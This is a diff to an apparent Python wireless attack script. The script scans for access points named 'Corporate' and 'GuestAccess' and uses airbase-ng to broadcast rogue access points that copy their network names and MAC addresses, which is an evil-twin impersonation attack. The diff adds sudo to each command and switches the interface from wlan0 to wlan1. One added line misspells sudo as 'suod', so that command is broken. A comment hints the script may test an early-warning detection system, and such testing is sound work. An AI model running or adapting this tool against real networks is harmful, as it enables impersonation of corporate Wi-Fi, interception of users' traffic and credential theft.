@@ -12,20 +12,20 @@ def wireless_targets():
 # This method is designed to gather wireless AP's and parse the data so both the ESSID and BSSID are usable in the methods below.
     
     print("Scanning for wireless access points (AP's)")
-    os.system("iw wlan0 scan > targets.txt")
-    os.system("awk -f scan2.awk targets.txt | grep Corporate | cut -d ' ' -f1 > corporate_APs.txt")
-    os.system("awk -f scan2.awk targets.txt | grep GuestAccess | cut -d ' ' -f1 > guestaccess_APs.txt")
+    os.system("sudo iw wlan1 scan > targets.txt")
+    os.system("sudo awk -f scan2.awk targets.txt | grep Corporate | cut -d ' ' -f1 > corporate_APs.txt")
+    os.system("suod awk -f scan2.awk targets.txt | grep GuestAccess | cut -d ' ' -f1 > guestaccess_APs.txt")
     print("Wireless targets have been scanned.")
     
 def attack_multi_tenancy():
 # This condition is met when an attacker creates an Access Point with the same BSSID or ESSID as an EWS BSSID or ESSID and they're active simultaneously. For example: employee_device, Corporate, or Guest or their respective MAC address (BSSID).
 
     print("The Multi-tenancy Attacks are being launched for each BSSID and ESSID's 'Corporate' and 'GuestAccess'... >:)\n")
-    proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'Corporate', '-Z' '4', '-s', 'wlan0'], stdout=subprocess.PIPE)
+    proc = subprocess.Popen(['nohup', 'sudo', 'airbase-ng', '-e', 'Corporate', '-Z' '4', '-s', 'wlan1'], stdout=subprocess.PIPE)
     pid_ = proc.pid
     os.system("sleep 4m")
     proc.kill()
-    proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'GuestAccess', 'wlan0'], stdout=subprocess.PIPE)
+    proc = subprocess.Popen(['nohup', 'sudo', 'airbase-ng', '-e', 'GuestAccess', 'wlan1'], stdout=subprocess.PIPE)
     pid_ = proc.pid
     os.system("sleep 4m")
     proc.kill()
@@ -33,7 +33,7 @@ def attack_multi_tenancy():
     infile = open('corporate_APs.txt', 'r')
     for line in infile:
         MAC = line
-        proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'earlywarning_WiFi', '-a', MAC, '-Z' '4', '-s', 'wlan0'], stdout=subprocess.PIPE)
+        proc = subprocess.Popen(['nohup', 'sudo', 'airbase-ng', '-e', 'earlywarning_WiFi', '-a', MAC, '-Z' '4', '-s', 'wlan1'], stdout=subprocess.PIPE)
         pid_ = proc.pid
         os.system("sleep 3m")
         proc.kill()
@@ -43,7 +43,7 @@ def attack_multi_tenancy():
     infile2 = open('guestaccess_APs.txt', 'r')
     for line in infile2:
         MAC = line
-        proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'earlywarning_WiFi', '-a', MAC, 'wlan0'], stdout=subprocess.PIPE)
+        proc = subprocess.Popen(['nohup', 'sudo', 'airbase-ng', '-e', 'earlywarning_WiFi', '-a', MAC, 'wlan1'], stdout=subprocess.PIPE)
         pid_ = proc.pid
         os.system("sleep 3m")
         proc.kill()
@@ -59,7 +59,7 @@ def attack_ap_spoofing_and_impersonation():
     infile = open('corporate_APs.txt', 'r')
     for line in infile:
         MAC = line
-        proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'Corporate', '-a', MAC, '-Z' '4', '-s', 'wlan0'], stdout=subprocess.PIPE)
+        proc = subprocess.Popen(['nohup', 'sudo', 'airbase-ng', '-e', 'Corporate', '-a', MAC, '-Z' '4', '-s', 'wlan1'], stdout=subprocess.PIPE)
         pid_ = proc.pid
         os.system("sleep 3m")
         proc.kill()
@@ -69,8 +69,8 @@ def attack_ap_spoofing_and_impersonation():
 
 
 def cleanup():
-    os.system('rm targets.txt corporate_APs.txt guestaccess_APs.txt')
-    os.system('ifconfig wlan0 down;sleep 20s;ifconfig wlan0 up')
+    os.system('sudo rm targets.txt corporate_APs.txt guestaccess_APs.txt')
+    os.system('sudo ifconfig wlan1 down;sudo sleep 20s;sudo ifconfig wlan1 up')
 
 
 def main():
